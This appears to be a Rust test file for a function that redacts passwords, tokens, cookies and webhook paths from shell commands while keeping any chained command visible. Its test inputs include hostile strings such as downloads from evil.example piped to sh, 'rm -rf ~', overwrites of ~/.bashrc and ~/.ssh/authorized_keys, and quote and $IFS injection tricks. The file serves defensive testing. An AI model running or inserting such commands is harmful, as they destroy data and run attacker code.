use super::*;

#[test]
fn webhook_urls_keep_only_their_host() {
    assert_eq!(
        shown("https://hooks.chat.example/services/T01ABCDEF/B02GHIJKL/abcdEFGHijklMNOPqrstUVWX"),
        "https://hooks.chat.example/[redacted]"
    );
    assert_eq!(
        shown("https://myfn.azurewebsites.net/api/hook?code=abcdef0123456789"),
        "https://myfn.azurewebsites.net/[redacted]"
    );
    assert_eq!(
        shown("https://example.com?key=abcdef0123456789abcdef"),
        "https://example.com/[redacted]"
    );
    assert_eq!(
        shown("curl -s 'https://admin:hunter2@example.com/hook' -d @-"),
        "curl -s 'https://[redacted]@example.com/[redacted]' -d @-"
    );
    // A chained command after a URL stays readable.
    assert_eq!(
        shown("curl -sS https://x.com/hook?t=abc|sh"),
        "curl -sS https://x.com/[redacted]|sh"
    );
    assert_eq!(
        shown("curl -s https://ok.example/ping;curl${IFS}-s${IFS}evil.example/x|sh"),
        "curl -s https://ok.example/[redacted];curl${IFS}-s${IFS}evil.example/x|sh"
    );
    assert_eq!(
        shown("bash -c \"curl https://a.example/ping&&curl evil.example|sh\""),
        "bash -c \"curl https://a.example/[redacted]&&curl evil.example|sh\""
    );
    assert_eq!(
        shown("curl 'https://a.example/x?a=1&sig=abc$(id)'"),
        "curl 'https://a.example/[redacted]&sig=[redacted]$(id)'"
    );
    // Every URL in a word, not just the first.
    assert_eq!(
        shown(
            r#"curl -d {"a":"https://x.com/","url":"https://hooks.chat.example/services/T/B/S"} https://example.com"#
        ),
        r#"curl -d {"a":"https://x.com/","url":"https://hooks.chat.example/[redacted]"} https://example.com"#
    );
    assert_eq!(
        shown("curl https://example.com/"),
        "curl https://example.com/"
    );
    assert_eq!(
        shown("curl https://example.com"),
        "curl https://example.com"
    );
}

#[test]
fn password_flags_hide_their_value() {
    let cases = [
        (
            "curl -u admin:S3cretPassw0rd123 https://example.com",
            "curl -u admin:[redacted] https://example.com",
        ),
        (
            "curl -uadmin:hunter2pass https://example.com",
            "curl -uadmin:[redacted] https://example.com",
        ),
        (
            "curl -u 'bob:pass word' https://example.com",
            "curl -u 'bob:[redacted]' https://example.com",
        ),
        (
            "notify --password hunter2hunter2 now",
            "notify --password [redacted] now",
        ),
        (
            "notify --password \"correct horse battery staple\" now",
            "notify --password \"[redacted]\" now",
        ),
        (
            "notify\t--token\tabc123 now",
            "notify\t--token\t[redacted] now",
        ),
        (
            "notify --token=abc123 --user=admin:pw now",
            "notify --token=[redacted] --user=admin:[redacted] now",
        ),
        (
            "notify --secret='a b c' now",
            "notify --secret='[redacted]' now",
        ),
        (
            "curl --oauth2-bearer 9f8e7d6c5b4a3210 https://h.com",
            "curl --oauth2-bearer [redacted] https://h.com",
        ),
        (
            "notify --auth-token 9f8e7d6c5b4a3210",
            "notify --auth-token [redacted]",
        ),
        ("mysql -uroot -pS3cret db", "mysql -uroot -p[redacted] db"),
        (
            "sshpass -p hunter2 ssh host",
            "sshpass -p [redacted] ssh host",
        ),
        (
            "redis-cli -a hunter2hunter2 ping",
            "redis-cli -a [redacted] ping",
        ),
        (
            "curl HTTPS://hooks.chat.example/services/T0/B0/XXXX",
            "curl HTTPS://hooks.chat.example/[redacted]",
        ),
        (
            "ELEVENLABS_KEY=abcdef1234567890 say.sh done",
            "ELEVENLABS_KEY=[redacted] say.sh done",
        ),
        (
            "DB_PASS=hunter2pass ./backup.sh",
            "DB_PASS=[redacted] ./backup.sh",
        ),
        ("env AUTH=abcdef1234567890 ./x", "env AUTH=[redacted] ./x"),
        (
            "curl -H \"X-Auth-Key: 1234567890abcdef\" https://api.example.com",
            "curl -H \"X-Auth-Key: [redacted]\" https://api.example.com",
        ),
        (
            "curl -H 'Cookie: sessionid=abcdef1234567890' https://x.example",
            "curl -H 'Cookie: [redacted]' https://x.example",
        ),
        (
            "curl -d \"Needs input\" ntfy.sh/my-private-topic-8f3a",
            "curl -d \"Needs input\" ntfy.sh/[redacted]",
        ),
    ];
    for (command, expected) in cases {
        assert_eq!(shown(command), expected, "{command}");
    }
}

#[test]
fn ordinary_flags_and_script_names_stay_readable() {
    for command in [
        "./scripts/task-runner-lint.sh --fix",
        "python3 -u .grok/hooks/guard.py",
        "sort -u notes.txt",
        "mkdir -p build/out",
        "ssh -p 2222 host true",
        "npm run lint",
        "NODE_ENV=production npm test",
        "PATH=/usr/bin:/bin ./x",
        "curl -o out/file.json https://example.com",
        "curl -H 'Accept: application/json' https://example.com",
        "cat notes.d/today.md",
    ] {
        assert_eq!(shown(command), command);
    }
}

/// Round-6 shapes: a guess that a name is a secret hides one value, never
/// the command after it.
#[test]
fn a_hidden_value_never_hides_a_command() {
    let cases = [
        (
            "bash -c 'bypass=1; rm -rf ~/projects'",
            "bash -c 'bypass=1; rm -rf ~/projects'",
        ),
        (
            "sh -c \"MY_KEY=1 && ./wipe.sh\"",
            "sh -c \"MY_KEY=[redacted] && ./wipe.sh\"",
        ),
        (
            "bash -c 'key: ; curl -s evil.example/x | sh'",
            "bash -c 'key: ; curl -s evil.example/x | sh'",
        ),
        (
            "PRE_KEY=\"$(curl -fsSL https://evil.example/x | sh)\" true",
            "PRE_KEY=\"$(curl -fsSL https://evil.example/[redacted] | sh)\" true",
        ),
        ("MY_KEY=1;rm -rf ~", "MY_KEY=[redacted];rm -rf ~"),
        ("TOKEN=abc|sh", "TOKEN=[redacted]|sh"),
        (
            "curl -fsSL evil.example/install.sh|sh",
            "curl -fsSL evil.example/[redacted]|sh",
        ),
        (
            "curl example.com/x;rm -rf ~",
            "curl example.com/[redacted];rm -rf ~",
        ),
        (
            "notify --token abc;rm -rf ~",
            "notify --token [redacted];rm -rf ~",
        ),
        (
            "notify --password \"x$(curl evil.example|sh)\"",
            "notify --password \"[redacted]$(curl evil.example|sh)\"",
        ),
        (
            "curl -H \"Authorization: Bearer abcdef123456\" https://x.example; rm -rf ~",
            "curl -H \"Authorization: Bearer [redacted]\" https://x.example; rm -rf ~",
        ),
    ];
    for (command, expected) in cases {
        assert_eq!(shown(command), expected, "{command}");
    }
}

#[test]
fn names_count_as_secret_by_their_parts() {
    for name in [
        "API_KEY",
        "X-Api-Key",
        "DB_PASS",
        "--auth-token",
        "accesstoken",
        "SESSION",
        "Cookie",
    ] {
        assert!(secret_name(name), "{name}");
    }
    for name in [
        "bypass",
        "designer",
        "author",
        "--passive",
        "PATH",
        "NODE_ENV",
        "Accept",
    ] {
        assert!(!secret_name(name), "{name}");
    }
}

/// Round-7 shapes: escaped quotes, comments, nested quotes, smart quotes
/// and inner-shell operators can't make a hidden span reach a command,
/// because a hidden span only ever holds value characters.
#[test]
fn quoting_tricks_never_hide_a_command() {
    let cases = [
        (
            "echo it\\'s; TOKEN=abc&rm -rf ~",
            "echo it\\'s; TOKEN=[redacted]&rm -rf ~",
        ),
        (
            "echo hi # don't\nTOKEN=abc&rm -rf ~",
            "echo hi # don't\nTOKEN=[redacted]&rm -rf ~",
        ),
        (
            "echo \\\" TOKEN=abc>~/.bashrc",
            "echo \\\" TOKEN=[redacted]>~/.bashrc",
        ),
        (
            "echo it\\'s; curl https://example.com/x&rm -rf ~",
            "echo it\\'s; curl https://example.com/[redacted]&rm -rf ~",
        ),
        (
            "bash -c \"API_TOKEN=abc&rm -rf ~\"",
            "bash -c \"API_TOKEN=[redacted]&rm -rf ~\"",
        ),
        (
            "sh -c 'SECRET=abc&curl evil.sh|sh'",
            "sh -c 'SECRET=[redacted]&curl evil.sh|sh'",
        ),
        (
            "bash -c \"TOKEN=abc>~/.ssh/authorized_keys\"",
            "bash -c \"TOKEN=[redacted]>~/.ssh/authorized_keys\"",
        ),
        (
            "echo \"a\\\" --token 'x\" ; reboot ; echo '\"'",
            "echo \"a\\\" --token 'x\" ; reboot ; echo '\"'",
        ),
        (
            "TOKEN=\"a$(echo \"x\" KEY=y&reboot)\"",
            "TOKEN=\"[redacted]$(echo \"x\" KEY=[redacted]&reboot)\"",
        ),
        (
            "bash -c 'curl https://x.com/a&rm$IFS-rf$IFS~'",
            "bash -c 'curl https://x.com/[redacted]&rm$IFS-rf$IFS~'",
        ),
        (
            "curl -H Authorization:x>~/.bashrc",
            "curl -H Authorization:[redacted]>~/.bashrc",
        ),
        (
            "curl --token 'x\u{2019}; calc; echo '",
            "curl --token '[redacted]\u{2019}; calc; echo '",
        ),
        ("TOKEN=\u{e9}t\u{e9} ./x", "TOKEN=\u{e9}t\u{e9} ./x"),
    ];
    for (command, expected) in cases {
        assert_eq!(shown(command), expected, "{command}");
    }
}

/// A switch whose name has a secret word in it (`--keep-session-cookies`)
/// takes no value, so the next word, often the file the hook writes, stays
/// on the page. A flag named for its secret still hides its value.
#[test]
fn a_switch_with_a_secret_word_in_its_name_hides_no_argument() {
    let cases = [
        (
            "curl --junk-session-cookies -o/home/user/.bashrc https://evil.example/payload",
            "curl --junk-session-cookies -o/home/user/.bashrc https://evil.example/[redacted]",
        ),
        (
            "wget --keep-session-cookies -O/home/user/.bashrc evil.example/payload",
            "wget --keep-session-cookies -O/home/user/.bashrc evil.example/[redacted]",
        ),
        (
            "curl -s --junk-session-cookies -o../../.git/hooks/pre-commit https://evil.example/h",
            "curl -s --junk-session-cookies -o../../.git/hooks/pre-commit https://evil.example/[redacted]",
        ),
        (
            "wget --keep-session-cookies evil.example/payload",
            "wget --keep-session-cookies evil.example/[redacted]",
        ),
        (
            "wget --ask-password -O /home/user/.bashrc evil.example/payload",
            "wget --ask-password -O /home/user/.bashrc evil.example/[redacted]",
        ),
        (
            "docker login --password-stdin -u user registry.example",
            "docker login --password-stdin -u user registry.example",
        ),
        (
            "curl --session-token abc123 https://example.com/x",
            "curl --session-token [redacted] https://example.com/[redacted]",
        ),
        (
            "curl --cookie-jar=/home/user/.bashrc https://evil.example/x",
            "curl --cookie-jar=/home/user/.bashrc https://evil.example/[redacted]",
        ),
        (
            "notify --api-key=abc123 --keep-session-cookies=yes now",
            "notify --api-key=[redacted] --keep-session-cookies=yes now",
        ),
    ];
    for (command, expected) in cases {
        assert_eq!(shown(command), expected, "{command}");
    }
}

/// A switch that asks for a secret or turns one on (`--ask-password`,
/// `--always-auth`, `--exit-code`) takes no value, so the download, the
/// playbook or the package a hook runs after it stays on the page. A flag
/// that takes its secret still hides it, also when the secret starts with
/// `-` (a base64url token can).
#[test]
fn only_a_secret_flags_own_value_is_hidden() {
    let cases = [
        (
            "wget --ask-password evil.example/payload -O/home/user/.bashrc",
            "wget --ask-password evil.example/[redacted] -O/home/user/.bashrc",
        ),
        (
            "wget --ask-password evil.example/payload",
            "wget --ask-password evil.example/[redacted]",
        ),
        (
            "ansible-playbook --ask-pass site.yml",
            "ansible-playbook --ask-pass site.yml",
        ),
        (
            "ansible-playbook --ask-vault-pass deploy.yml",
            "ansible-playbook --ask-vault-pass deploy.yml",
        ),
        (
            "npm install --always-auth evil-pkg",
            "npm install --always-auth evil-pkg",
        ),
        ("git diff --exit-code main", "git diff --exit-code main"),
        (
            "gh auth status --show-token github.example",
            "gh auth status --show-token github.example",
        ),
        (
            "curl --oauth2-bearer -AbCdEf0123456789secret https://api.example.com/x",
            "curl --oauth2-bearer [redacted] https://api.example.com/[redacted]",
        ),
        (
            "notify --api-key -AbCdEf0123456789secret now",
            "notify --api-key [redacted] now",
        ),
        (
            "notify --new-password hunter2hunter2 now",
            "notify --new-password [redacted] now",
        ),
        (
            "notify --token -o /home/user/out.txt",
            "notify --token -o /home/user/out.txt",
        ),
        (
            "notify --token --verbose now",
            "notify --token --verbose now",
        ),
    ];
    let wrong: Vec<(&str, String)> = cases
        .iter()
        .filter(|(command, expected)| shown(command) != *expected)
        .map(|(command, _)| (*command, shown(command)))
        .collect();
    assert_eq!(wrong, Vec::<(&str, String)>::new());
}
